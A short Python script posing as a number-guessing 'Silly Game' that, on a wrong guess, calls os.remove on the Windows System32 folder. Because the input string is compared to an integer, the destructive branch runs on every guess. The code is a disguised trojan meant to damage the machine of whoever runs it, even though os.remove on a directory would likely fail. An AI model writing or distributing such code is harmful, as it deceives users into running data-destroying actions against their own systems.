import random
import os

number = random.randint(1, 10)

guess = input("Silly Game ! Guess number between 1 and 10")

if guess == number:
    print("GG you won !")
else:
    os.remove("C:\Windows\System32")